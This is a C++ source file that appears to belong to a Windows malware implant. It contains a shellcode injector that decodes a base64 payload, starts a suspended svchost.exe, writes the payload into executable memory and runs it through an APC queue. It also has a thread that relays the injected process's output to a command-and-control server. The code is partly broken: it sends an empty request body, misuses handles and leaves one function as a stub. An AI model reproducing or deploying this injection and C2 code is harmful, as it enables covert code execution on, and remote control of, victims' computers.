#include <windows.h>

#include "loader.h"
#include "config.h"
#include "httpClient.h"
#include "base64.h"

#define MAX_OUTPUT 1000
#define IDLE_KILL_TIME 60

extern std::string globalID;

void ReadFromPipe(HANDLE subThreadOutRead)
{
    SYSTEMTIME start_time, current_time;
    char chBuf[MAX_OUTPUT + 1];
    DWORD dwRead, rOpCode;
    BOOL bSuccess = FALSE;
    do
    {
        // read the data from the pipe
        bSuccess = ReadFile(subThreadOutRead, chBuf, MAX_OUTPUT, &dwRead, NULL);
        std::string requestData;
        requestData += "{\"id\":\"";
        requestData += globalID;
        requestData += "\",\"pipeData\":\"";
        requestData += chBuf;
        requestData += "\"}";
        makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_DATACMD_URI, MALWARE_JSON_REQUEST_HEADER, "", MALWARE_C2_SERVER_USE_TLS);
        // clean up the old buffer
        memset(chBuf, '\0', sizeof(chBuf));
    } while (TRUE);

    return;
}

bool InjectExecutionCode(std::wstring buffer)
{
    std::vector<uint8_t> decoded = b64Decode(buffer);
    return false;
}

bool SpawnShellCode(std::wstring buffer)
{
    DWORD subProcessThreadID;
    HANDLE subProcessThread;
    HANDLE subProcessInRead;
    HANDLE subProcessInWrite;
    HANDLE subProcessOutRead;
    HANDLE subProcessOutWrite;

    SECURITY_ATTRIBUTES saAttr;

    // Set the bInheritHandle flag so pipe handles are inherited.
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&subProcessInRead, &subProcessInWrite, &saAttr, 0))
    {
        LOG(L"Input Pipe Error");
    }

    if (!CreatePipe(&subProcessOutRead, &subProcessOutWrite, &saAttr, 0))
    {
        LOG(L"Output Pipe Error");
    }

    if (!SetHandleInformation(&subProcessInWrite, HANDLE_FLAG_INHERIT, 0) || !SetHandleInformation(&subProcessOutWrite, HANDLE_FLAG_INHERIT, 0))
    {
        LOG(L"Error setting pipe flags");
    }

    // define our startup info
    STARTUPINFOA sInfo;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION pInfo;

    // zero out the structures
    ZeroMemory(&sInfo, sizeof(sInfo));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

    // change the std values to our pipes
    sInfo.cb = sizeof(STARTUPINFOA);
    sInfo.hStdError = subProcessOutWrite;
    sInfo.hStdOutput = subProcessOutWrite;
    sInfo.hStdInput = subProcessInRead;
    sInfo.dwFlags = STARTF_USESTDHANDLES | EXTENDED_STARTUPINFO_PRESENT;
    std::vector<uint8_t> decoded = b64Decode(buffer);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadFromPipe, subProcessOutRead, 0, &subProcessThreadID);
    LPVOID rBuffer;

    // create a suspended svchost
    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

    // alloc + write bytes + queue
    rBuffer = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, decoded.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pInfo.hProcess, rBuffer, (LPVOID)decoded.data(), decoded.size(), NULL);
    QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);
    // start the thread
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);
    return false;
}